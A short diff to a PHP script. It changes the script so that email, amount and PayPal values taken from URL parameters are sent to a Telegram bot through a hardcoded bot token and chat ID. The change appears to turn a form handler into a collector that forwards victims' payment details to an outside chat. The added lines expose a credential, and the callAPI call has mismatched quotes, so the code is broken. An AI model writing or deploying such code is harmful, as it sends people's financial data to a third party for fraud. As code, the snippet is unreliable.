@@ -34,5 +34,8 @@ $mail="Email: ".$_GET["mail"];
 $amt="Amount: ".$_GET["amt"];
 $paypal="PayPal: ".$_GET["paypal"];
 $data=$mail."\r\n".$amt."\r\n".$paypal;
-echo $data;
+$data=urlencode($data);
+$url="https://api.telegram.org/bot1810918140:AAEDH8WcSw3FVgI_93Yp9cJcTPUIZ58ODFg/sendMessage?chat_id=1755250596&text=".$data;
+callAPI('GET",$url,false);
+echo "sent";
 ?>
